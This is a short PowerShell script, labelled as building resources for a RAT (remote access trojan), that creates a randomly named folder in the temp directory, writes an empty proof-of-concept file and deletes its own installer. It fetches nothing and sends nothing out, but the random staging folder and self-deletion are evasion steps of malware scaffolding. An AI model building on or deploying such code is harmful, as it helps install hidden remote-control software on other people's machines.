#builds resources for RAT
# created by petros

#random string for directory
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

##  variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = "%cd%"

# go to temp, make working directory

mkdir $path
Set-Location $path
Write-Output "" > poc.txt
Set-Location $initial_dir

# deletes itself
del installer.ps1